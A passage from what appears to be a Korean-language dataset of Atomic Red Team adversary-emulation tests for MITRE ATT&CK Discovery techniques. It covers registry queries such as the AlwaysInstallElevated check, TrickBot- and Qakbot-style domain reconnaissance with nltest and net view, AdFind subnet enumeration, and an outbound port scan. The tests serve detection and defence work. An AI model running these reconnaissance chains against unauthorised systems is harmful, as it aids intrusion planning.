        "레지스트리 정책 키에 접근하기 위해 관리자 권한 cmd.exe 세션이 필요하다.",
        "시스템에 소프트웨어 설치 정책(AlwaysInstallElevated)이 구성되어 있지 않을 경우, reg query가 실패할 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "AlwaysInstallElevated 정책 값을 조회하는 레지스트리 유틸리티",
            "commandline_pattern": "reg query *AlwaysInstallElevated*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 별도로 롤백할 변경 사항은 없다."
      ],
      "tags": {
        "action": ["registry_query"],
        "domain": ["Discovery", "PrivilegeEscalation"],
        "ttp": ["Query_Registry", "AlwaysInstallElevated_Check"]
      },
      "metadata": {
        "atomic_source_id": "6fb4c4c5-f949-4fd2-8af5-ddbc61595223",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/"
        ]
      }
    },
    {
      "test_id": "T1012-5",
      "name": "Check Software Inventory Logging (SIL) status via Registry",
      "platforms": ["windows"],
      "summary": "reg.exe로 Software Inventory Logging(SIL) 관련 레지스트리 키를 조회해, 호스트 단위 소프트웨어 인벤토리 수집 기능이 활성화되어 있는지 확인한다. 공격자는 이를 이용해 특정 소프트웨어 존재 여부를 간접적으로 파악할 수 있다.",
      "procedure": [
        "cmd.exe에서 reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64 명령을 실행한다.",
        "collectionstate 값이 0 또는 1 등의 상태 값인지 확인하여 SIL 기능 활성 여부를 판별한다.",
        "필요 시 해당 정보를 바탕으로 대상 환경에 설치된 소프트웨어 인벤토리 수집 정책을 추정한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64"
        }
      ],
      "prerequisites": [
        "HKLM\\software\\microsoft\\windows\\softwareinventorylogging 키는 SIL 기능이 구성된 환경에서만 존재할 수 있으며, 없는 경우 reg query가 실패한다.",
        "64비트 레지스트리 뷰를 조회하기 위해 /reg:64 옵션이 사용된다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          "HKLM\\software\\microsoft\\windows\\softwareinventorylogging"
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "Software Inventory Logging 상태를 조회하는 레지스트리 유틸리티",
            "commandline_pattern": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "상태 조회만 수행하므로 별도의 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["registry_query"],
        "domain": ["Discovery"],
        "ttp": ["Query_Registry", "Software_Inventory_Logging_Check"]
      },
      "metadata": {
        "atomic_source_id": "5c784969-1d43-4ac7-8c3d-ed6d025ed10d",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/",
          "https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/"
        ]
      }
    },
    {
      "test_id": "T1012-6",
      "name": "Inspect SystemStartOptions Value in Registry",
      "platforms": ["windows"],
      "summary": "reg.exe를 사용해 HKLM\\SYSTEM\\CurrentControlSet\\Control 키의 SystemStartOptions 값을 조회해 시스템 부팅 옵션(부팅 모드, 디버그 설정 등)을 확인한다. 이는 보안 관련 부팅 설정을 파악하는 데 사용될 수 있다.",
      "procedure": [
        "cmd.exe에서 reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions 명령을 실행한다.",
        "출력된 SystemStartOptions 문자열에서 부팅 모드(예: SAFEBOOT, NOEXECUTE 정책, 디버그 플래그 등)를 확인한다.",
        "공격자는 이를 통해 보안 정책(예: 커널 DEP, 드라이버 서명 강제 등)이나 부팅 환경 제약을 파악할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions"
        }
      ],
      "prerequisites": [
        "HKLM\\SYSTEM\\CurrentControlSet\\Control에 대한 읽기 권한이 필요하며, 일반적으로 관리자 권한 cmd.exe 세션이 사용된다.",
        "일부 환경에서는 SystemStartOptions 값이 설정되어 있지 않을 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          "HKLM\\SYSTEM\\CurrentControlSet\\Control"
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "부팅 옵션을 확인하기 위해 SystemStartOptions 값을 조회하는 레지스트리 유틸리티",
            "commandline_pattern": "reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions"
          }
        ],
        "network": []
      },
      "cleanup": [
        "쿼리만 수행하므로 환경에 남는 변경 사항은 없다."
      ],
      "tags": {
        "action": ["registry_query"],
        "domain": ["Discovery"],
        "ttp": ["Query_Registry", "Boot_Option_Inspection"]
      },
      "metadata": {
        "atomic_source_id": "96257079-cdc1-4aba-8705-3146e94b6dce",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1016",
  "technique_name": "System Network Configuration Discovery",
  "tactic": "Discovery",
  "description": "시스템 네트워크 구성 탐색은 호스트의 IP 설정, 라우팅, 인터페이스 상태, 방화벽 규칙, AD 서브넷/도메인 정보 등을 수집해 내부 네트워크 구조와 보안 설정을 파악하는 기법이다. 공격자는 이를 통해 측면 이동 경로, 방화벽 우회 가능 포트, 도메인 구조 등을 이해하고 후속 공격(권한 상승, 데이터 탈취, C2 통신)에 활용할 수 있다.",
  "tests": [
    {
      "test_id": "T1016-1",
      "name": "System Network Configuration Discovery on Windows",
      "platforms": ["windows"],
      "summary": "ipconfig, netsh, arp, nbtstat, net config 등을 이용해 기본 네트워크 설정, 인터페이스 상태, ARP 캐시, NetBIOS 이름, 네트워크 서비스 구성을 조회한다.",
      "procedure": [
        "cmd.exe에서 ipconfig /all을 실행해 어댑터별 IP 주소, 서브넷 마스크, 게이트웨이, DNS 서버, DHCP 상태 등을 확인한다.",
        "netsh interface show interface로 네트워크 인터페이스 목록과 상태(Enabled/Disabled, Connected 등)를 조회한다.",
        "arp -a로 현재 ARP 캐시를 출력해 같은 서브넷에 통신한 호스트의 IP/MAC 정보를 확인한다.",
        "nbtstat -n으로 로컬 NetBIOS 이름과 등록된 이름들을 확인한다.",
        "net config 명령으로 워크스테이션/서버 서비스의 기본 네트워크 구성을 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "ipconfig /all\r\nnetsh interface show interface\r\narp -a\r\nnbtstat -n\r\nnet config"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 기본 네트워크 도구(ipconfig, netsh, arp, nbtstat, net)가 사용 가능해야 한다.",
        "도메인/워크그룹 구성에 따라 net config 출력 내용은 달라질 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ipconfig.exe",
            "description": "네트워크 인터페이스의 IP 설정을 출력",
            "commandline_pattern": "ipconfig /all"
          },
          {
            "name": "netsh.exe",
            "description": "인터페이스 상태를 조회",
            "commandline_pattern": "netsh interface show interface"
          },
          {
            "name": "arp.exe",
            "description": "ARP 캐시를 조회",
            "commandline_pattern": "arp -a"
          },
          {
            "name": "nbtstat.exe",
            "description": "NetBIOS 이름 테이블을 조회",
            "commandline_pattern": "nbtstat -n"
          },
          {
            "name": "net.exe",
            "description": "워크스테이션/서버 서비스 정보를 조회",
            "commandline_pattern": "net config*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "해당 테스트는 조회 명령만 수행하므로 별도의 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["net_enum", "config_discovery"],
        "domain": ["Discovery"],
        "ttp": ["Network_Config_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "970ab6a1-0157-4f3f-9a73-ec4166754b23",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/"
        ]
      }
    },
    {
      "test_id": "T1016-2",
      "name": "List Windows Firewall Rules",
      "platforms": ["windows"],
      "summary": "netsh advfirewall firewall show rule name=all 명령으로 로컬 Windows 방화벽 규칙 전체를 나열해 인바운드/아웃바운드 허용·차단 상태를 확인한다.",
      "procedure": [
        "cmd.exe에서 netsh advfirewall firewall show rule name=all 명령을 실행한다.",
        "출력 결과에서 프로그램 경로, 포트, 프로토콜, 프로필(도메인/프라이빗/공용), 동작(허용/차단) 정보를 확인한다.",
        "공격자는 이를 통해 이미 허용된 포트나 프로그램을 악용해 C2 통신이나 데이터 유출을 시도할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "netsh advfirewall firewall show rule name=all"
        }
      ],
      "prerequisites": [
        "Windows 방화벽이 설치·구성되어 있어야 하며, 방화벽 설정 조회를 위해 관리자 권한이 권장된다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "netsh.exe",
            "description": "Windows 방화벽 규칙을 나열하는 유틸리티",
            "commandline_pattern": "netsh advfirewall firewall show rule name=all"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회만 수행하므로 환경 변경은 없다."
      ],
      "tags": {
        "action": ["firewall_enum"],
        "domain": ["Discovery"],
        "ttp": ["Firewall_Rule_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "038263cb-00f4-4b0a-98ae-0696c67e1752",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/"
        ]
      }
    },
    {
      "test_id": "T1016-3",
      "name": "System Network Configuration Discovery (TrickBot Style)",
      "platforms": ["windows"],
      "summary": "TrickBot 악성코드에서 관찰된 것과 유사하게 ipconfig, net config workstation, net view, nltest를 사용해 네트워크 구성과 도메인 정보를 수집한다.",
      "procedure": [
        "ipconfig /all로 네트워크 인터페이스 설정을 조회한다.",
        "net config workstation으로 워크스테이션 이름, 도메인/워크그룹, 로그온 도메인 등의 정보를 수집한다.",
        "net view /all /domain으로 도메인 내 공유 리소스 및 컴퓨터 목록을 열거한다.",
        "nltest /domain_trusts 명령을 통해 도메인 트러스트 관계를 조회해 다른 도메인으로의 이동 가능성을 파악한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "ipconfig /all\r\nnet config workstation\r\nnet view /all /domain\r\nnltest /domain_trusts"
        }
      ],
      "prerequisites": [
        "도메인 환경일 경우 net view, nltest 출력이 보다 유의미하다.",
        "nltest는 일부 Windows 버전에서 기본 포함되어 있지 않을 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ipconfig.exe",
            "description": "IP 설정 조회",
            "commandline_pattern": "ipconfig /all"
          },
          {
            "name": "net.exe",
            "description": "워크스테이션 정보 및 도메인 공유 열거",
            "commandline_pattern": "net config workstation|net view /all /domain"
          },
          {
            "name": "nltest.exe",
            "description": "도메인 트러스트 관계 및 도메인 컨트롤러 정보를 조회",
            "commandline_pattern": "nltest /domain_trusts"
          }
        ],
        "network": []
      },
      "cleanup": [
        "조회 명령만 수행하므로 별도의 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["net_enum", "ad_enum"],
        "domain": ["Discovery"],
        "ttp": ["TrickBot_Like_Recon"]
      },
      "metadata": {
        "atomic_source_id": "dafaf052-5508-402d-bf77-51e0700c02e2",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/",
          "https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/"
        ]
      }
    },
    {
      "test_id": "T1016-4",
      "name": "List Open Egress Ports",
      "platforms": ["windows"],
      "summary": "PowerShell로 사전 정의된 포트 목록을 읽어 allports.exposed 호스트에 TCP 연결을 시도해 아웃바운드로 열려 있는 포트를 식별하고 결과를 파일로 저장한다.",
      "procedure": [
        "사전 조건으로 top-128.txt 파일을 다운로드하여 포트 목록(기본 128개 인기 포트)을 준비한다.",
        "PowerShell에서 포트 파일을 읽어 각 포트에 대해 System.Net.Sockets.TcpClient로 allports.exposed:포트에 연결을 시도한다.",
        "연결 성공 시 \"<port> open\", 실패 시 \"<port> closed\"를 콘솔과 결과 파일(#{output_file})에 기록한다.",
        "모든 포트 테스트 후 총 오픈 포트 수와 전체 테스트 포트 수를 요약해 파일 마지막 줄에 추가한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$ports = Get-content \"#{port_file}\"\r\n$file = \"#{output_file}\"\r\n$totalopen = 0\r\n$totalports = 0\r\nNew-Item $file -Force | Out-Null\r\nforeach ($port in $ports) {\r\n    $test = New-Object system.Net.Sockets.TcpClient\r\n    $wait = $test.BeginConnect(\"allports.exposed\", $port, $null, $null)\r\n    $wait.AsyncWaitHandle.WaitOne(250, $false) | Out-Null\r\n    $totalports++ | Out-Null\r\n    if ($test.Connected) {\r\n        $result = \"$port open\"\r\n        Write-Host $result\r\n        $result | Out-File -Encoding ASCII -Append $file\r\n        $totalopen++ | Out-Null\r\n    }\r\n    else {\r\n        $result = \"$port closed\"\r\n        Write-Host $result\r\n        $totalclosed++ | Out-Null\r\n        $result | Out-File -Encoding ASCII -Append $file\r\n    }\r\n}\r\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\r\n$results | Out-File -Encoding ASCII -Append $file\r\nWrite-Host $results"
        }
      ],
      "prerequisites": [
        "인터넷에 연결되어 있어야 하며, allports.exposed 도메인으로의 접근이 가능해야 한다.",
        "사전 조건 스크립트로 PathToAtomicsFolder\\T1016\\src\\top-128.txt가 다운로드되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{output_file}",
            "description": "각 포트의 open/closed 상태와 최종 요약이 기록된 텍스트 파일"
          }
        ],
        "files_read": [
          {
            "path": "#{port_file}",
            "description": "스캔 대상 포트 번호가 한 줄에 하나씩 담긴 목록 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "TCP 클라이언트를 사용해 원격 호스트의 포트 개방 여부를 테스트",
            "commandline_pattern": "powershell.exe *allports.exposed*"
          }
        ],
        "network": [
          {
            "protocol": "tcp",
            "destination": "allports.exposed",
            "ports": "top-128.txt에 정의된 포트 목록"
          }
        ]
      },
      "cleanup": [
        "Remove-Item -ErrorAction ignore \"#{output_file}\""
      ],
      "tags": {
        "action": ["egress_test", "port_scan"],
        "domain": ["Discovery"],
        "ttp": ["Outbound_Port_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "4b467538-f102-491d-ace7-ed487b853bf5",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/",
          "https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/"
        ]
      }
    },
    {
      "test_id": "T1016-5",
      "name": "Adfind - Enumerate Active Directory Subnet Objects",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 AD 환경에서 objectcategory=subnet 객체를 검색하여 서브넷 정보를 열거한다. 랜섬웨어·침해 사례에서 관측된 정찰 기법이다.",
      "procedure": [
        "사전 조건으로 PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe를 다운로드해 준비한다.",
        "cmd.exe에서 AdFind.exe -f (objectcategory=subnet) #{optional_args} 명령을 실행한다.",
        "출력 결과에서 AD에 정의된 서브넷 이름, 주소, 사이트 매핑 정보를 확인한다.",
        "공격자는 이를 통해 네트워크 세그먼트 구조와 AD 사이트 설계를 파악할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet) #{optional_args}"
        }
      ],
      "prerequisites": [
        "테스트 시스템이 도메인에 조인되어 있고, 도메인 컨트롤러에 네트워크로 접근 가능해야 한다.",
        "AdFind.exe가 지정된 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "LDAP 쿼리를 통해 AD 서브넷 객체를 열거하는 도구",
            "commandline_pattern": "AdFind.exe -f (objectcategory=subnet)*"
          }
        ],
        "network": [
          {
            "protocol": "ldap",
            "destination": "도메인 컨트롤러",
            "ports": "389 또는 636(SSL 사용 시)"
          }
        ]
      },
      "cleanup": [
        "AdFind.exe 자체는 삭제하지 않지만, 필요 시 PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe를 수동으로 제거할 수 있다."
      ],
      "tags": {
        "action": ["ad_enum", "subnet_enum"],
        "domain": ["Discovery"],
        "ttp": ["AD_Subnet_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "9bb45dd7-c466-4f93-83a1-be30e56033ee",
        "reference_links": [
          "http://www.joeware.net/freetools/tools/adfind/",
          "https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html"
        ]
      }
    },
    {
      "test_id": "T1016-6",
      "name": "Qakbot Recon",
      "platforms": ["windows"],
      "summary": "Qakbot 악성코드에서 관찰된 정찰용 명령 모음을 배치 파일(qakbot.bat)로 실행해 네트워크·도메인 정보를 수집한다.",
      "procedure": [
        "사전 조건으로 PathToAtomicsFolder\\\\T1016\\\\src\\\\qakbot.bat 파일을 다운로드한다.",
        "cmd.exe에서 qakbot.bat 스크립트를 그대로 실행한다.",
        "스크립트 내부에서 ipconfig, net, nltest 등 다양한 네트워크·도메인 관련 명령을 순차적으로 호출해 결과를 표준 출력으로 남긴다.",
        "공격자는 동일한 명령 세트를 통해 네트워크 구조, 도메인 정보, 공유 리소스 등을 한 번에 수집할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"#{recon_commands}\""
        }
      ],
      "prerequisites": [
        "qakbot.bat 파일이 지정된 경로에 존재해야 한다.",
        "스크립트 내에서 호출하는 네트워크/도메인 명령들이 시스템에 설치되어 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "#{recon_commands}",
            "description": "Qakbot에서 사용되는 정찰 명령 목록을 포함한 배치 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "배치 스크립트(qakbot.bat)를 실행하는 셸",
            "commandline_pattern": "cmd.exe *qakbot.bat*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 실행 후 qakbot.bat을 유지하거나 수동으로 삭제할 수 있다. 환경 변경은 없다."
      ],
      "tags": {
        "action": ["net_enum", "recon_script"],
        "domain": ["Discovery"],
        "ttp": ["Qakbot_Style_Recon"]
      },
      "metadata": {
        "atomic_source_id": "121de5c6-5818-4868-b8a7-8fd07c455c1b",
        "reference_links": [
          "https://securelist.com/qakbot-technical-analysis/103931/"
        ]
      }
    },
    {
      "test_id": "T1016-7",
      "name": "DNS Server Discovery Using nslookup",
      "platforms": ["windows"],
      "summary": "nslookup을 이용해 _ldap._tcp.dc._msdcs.<도메인> 레코드에 질의하여 도메인 컨트롤러 DNS 정보를 조회한다. Qakbot 등이 도메인 정보 수집에 사용하는 방식이다.",
      "procedure": [
        "cmd.exe에서 nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN% 명령을 실행한다.",
        "DNS 응답에서 도메인 컨트롤러 FQDN, IP 주소 및 LDAP 서비스 관련 레코드를 확인한다.",
        "공격자는 이를 통해 AD 도메인 컨트롤러 위치를 파악하고 후속 공격(인증 시도, Kerberos·LDAP 악용 등)을 계획할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%"
        }
      ],
      "prerequisites": [
        "호스트가 AD 도메인에 조인되어 있어야 하며, USERDNSDOMAIN 환경 변수가 적절히 설정되어 있어야 한다.",
        "DNS 서버가 _ldap._tcp.dc._msdcs.<도메인> SRV 레코드를 제공해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "nslookup.exe",
            "description": "도메인 컨트롤러 관련 DNS 레코드를 조회",
            "commandline_pattern": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%"
          }
        ],
        "network": [
          {
            "protocol": "udp/tcp",
            "destination": "구성된 DNS 서버",
            "ports": "53"
          }
        ]
      },
      "cleanup": [
        "DNS 조회만 수행하므로 환경 정리는 필요 없다."
      ],
      "tags": {
        "action": ["dns_enum", "dc_discovery"],
        "domain": ["Discovery"],
        "ttp": ["DNS_Server_Discovery", "Domain_Controller_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "34557863-344a-468f-808b-a1bfb89b4fa9",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/",
          "https://securelist.com/qakbot-technical-analysis/103931/"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1016.001",
  "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
  "tactic": "Discovery",
  "description": "인터넷 연결 탐색은 호스트가 외부 네트워크(인터넷, 특정 서비스 포트 등)에 실제로 접속 가능한지 확인하기 위해 ICMP 핑, TCP 연결 테스트 등을 수행하는 기법이다. 공격자는 이를 통해 프록시/방화벽 정책, 허용된 포트와 도메인, SMB 등 내부·외부 서비스 접근 가능 여부를 파악하고 C2 통신 경로나 데이터 유출 채널을 설계할 수 있다.",
  "tests": [
    {
      "test_id": "T1016.001-1",
      "name": "Check internet connection using ping (Windows)",
      "platforms": ["windows"],
      "summary": "Windows에서 ping 명령을 사용해 8.8.8.8 등 외부 호스트로 ICMP 에코 요청을 보내 인터넷 연결 상태를 확인한다.",
      "procedure": [
        "cmd.exe를 사용해 ping 명령을 실행한다.",
        "기본 대상은 8.8.8.8(구글 Public DNS)이며, 필요 시 #{ping_target} 인자를 다른 IP 또는 호스트로 변경한다.",
        "ping -n 4 #{ping_target} 명령을 통해 4회 ICMP 요청을 보내고 응답 시간, 손실률 등을 확인한다.",
        "응답이 없거나 100% 손실일 경우 방화벽/라우팅/프록시 등의 영향으로 외부 네트워크 접속이 제한되어 있을 가능성을 고려한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "ping -n 4 #{ping_target}"
        }
      ],
      "prerequisites": [
        "ICMP 에코 요청이 네트워크 경로 및 대상에서 허용되어 있어야 한다.",
        "대상 호스트(기본 8.8.8.8)가 네트워크 상에서 도달 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ping.exe",
            "description": "ICMP 에코 요청을 통해 네트워크 연결 상태 확인",
            "commandline_pattern": "ping -n 4 *"
          }
        ],
        "network": [
          {
            "protocol": "icmp",
            "destination": "#{ping_target}",
            "ports": "N/A"
          }
        ]
      },
      "cleanup": [
        "별도의 파일이나 설정 변경이 없으므로 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["connectivity_check", "icmp_probe"],
        "domain": ["Discovery"],
        "ttp": ["Internet_Connectivity_Probe"]
      },
      "metadata": {
        "atomic_source_id": "e184b6bd-fb28-48aa-9a59-13012e33d7dc",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/001/"
        ]
      }
    },
    {
      "test_id": "T1016.001-2",
      "name": "Check internet connection using Test-NetConnection (ICMP-Ping)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Test-NetConnection cmdlet을 사용해 ICMP(Ping) 기반으로 지정한 대상(기본 8.8.8.8)의 연결 상태를 점검한다.",
      "procedure": [
        "PowerShell 세션을 연다.",
        "Test-NetConnection -ComputerName #{target} 명령을 실행해 ICMP 핑을 포함한 연결 상태를 확인한다.",
        "출력 결과에서 PingSucceeded, RoundTripTime 등 필드를 확인해 인터넷 또는 대상 호스트와의 연결이 정상인지 판단한다.",
        "필요 시 #{target} 값을 다른 IP 또는 도메인으로 변경해 특정 서비스 또는 네트워크 구간을 점검한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Test-NetConnection -ComputerName #{target}"
        }
      ],
      "prerequisites": [
        "Windows PowerShell 4.0 이상 환경에서 Test-NetConnection cmdlet이 사용 가능해야 한다.",
        "ICMP 트래픽이 네트워크 경로에서 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Test-NetConnection을 이용해 대상과의 연결 상태를 검사",
            "commandline_pattern": "powershell*Test-NetConnection -ComputerName*"
          }
        ],
        "network": [
          {
            "protocol": "icmp",
            "destination": "#{target}",
            "ports": "N/A"
          }
        ]
      },
      "cleanup": [
        "조회성 명령만 수행하므로 추가 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["connectivity_check", "icmp_probe"],
        "domain": ["Discovery"],
        "ttp": ["Internet_Connectivity_Probe_PS"]
      },
      "metadata": {
        "atomic_source_id": "f8160cde-4e16-4c8b-8450-6042d5363eb0",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/001/"
        ]
      }
    },
    {
      "test_id": "T1016.001-3",
      "name": "Check internet connection using Test-NetConnection (TCP-HTTP)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Test-NetConnection을 사용해 TCP 80(HTTP) 포트 기준으로 외부 웹 사이트(기본 www.google.com)와의 연결 가능 여부를 확인한다.",
      "procedure": [
        "PowerShell에서 Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target} 명령을 실행한다.",
        "출력 결과에서 TcpTestSucceeded, RemotePort, RemoteAddress 등의 필드를 확인해 HTTP 포트(80)로의 아웃바운드 접속이 가능한지 판단한다.",
        "프록시, 방화벽, DNS 설정 등에 따라 실패할 수 있으며, 공격자는 이를 기반으로 C2 통신에 사용할 도메인/포트 전략을 조정할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target}"
        }
      ],
      "prerequisites": [
        "대상 호스트(기본 www.google.com)에 대한 DNS 해석이 가능해야 한다.",
        "아웃바운드 TCP 80 포트가 방화벽 또는 프록시에 의해 완전히 차단되어 있지 않아야 한다.",
        "PowerShell에서 Test-NetConnection cmdlet 사용이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "HTTP 포트(80)로의 TCP 연결을 테스트",
            "commandline_pattern": "powershell*Test-NetConnection -CommonTCPPort HTTP*"
          }
        ],
        "network": [
          {
            "protocol": "tcp",
            "destination": "#{target}",
            "ports": "80"
          }
        ]
      },
      "cleanup": [
        "네트워크 테스트만 수행하므로 추가 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["connectivity_check", "http_egress_test"],
        "domain": ["Discovery"],
        "ttp": ["HTTP_Egress_Test"]
      },
      "metadata": {
        "atomic_source_id": "7c35779d-42ec-42ab-a283-6255b28e9d68",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/001/"
        ]
      }
    },
    {
      "test_id": "T1016.001-4",
      "name": "Check internet connection using Test-NetConnection (TCP-SMB)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Test-NetConnection을 사용해 TCP 445(SMB) 포트 기준으로 외부 호스트(기본 8.8.8.8)에 대한 SMB 아웃바운드 연결 가능 여부를 점검한다.",
      "procedure": [
        "PowerShell에서 Test-NetConnection -CommonTCPPort SMB -ComputerName #{target} 명령을 실행한다.",
        "TcpTestSucceeded 값이 True인지 확인해, 외부로 SMB(445/tcp) 연결이 허용되는지 판단한다.",
        "조직 정책상 외부 SMB가 차단되어야 정상인 환경도 있으므로, 결과를 정책과 비교해 해석한다.",
        "공격자는 SMB가 외부로 열려 있을 경우, SMB 터널링이나 파일 공유 기반 데이터 유출 채널로 악용할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Test-NetConnection -CommonTCPPort SMB -ComputerName #{target}"
        }
      ],
      "prerequisites": [
        "PowerShell Test-NetConnection cmdlet이 사용 가능해야 한다.",
        "네트워크/방화벽 정책에 따라 외부 445/tcp 트래픽이 차단되어 있을 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "SMB 포트(445)로의 TCP 연결을 테스트",
            "commandline_pattern": "powershell*Test-NetConnection -CommonTCPPort SMB*"
          }
        ],
        "network": [
          {
            "protocol": "tcp",
            "destination": "#{target}",
            "ports": "445"
          }
        ]
      },
      "cleanup": [
        "네트워크 테스트만 수행하며 시스템 상태 변화가 없으므로 정리 작업은 필요 없다."
      ],
      "tags": {
        "action": ["connectivity_check", "smb_egress_test"],
        "domain": ["Discovery"],
        "ttp": ["SMB_Egress_Test"]
      },
      "metadata": {
        "atomic_source_id": "d9c32b3b-7916-45ad-aca5-6c902da80319",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/001/"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1016.002",
  "technique_name": "System Network Configuration Discovery: Wi-Fi Discovery",
  "tactic": "Discovery",
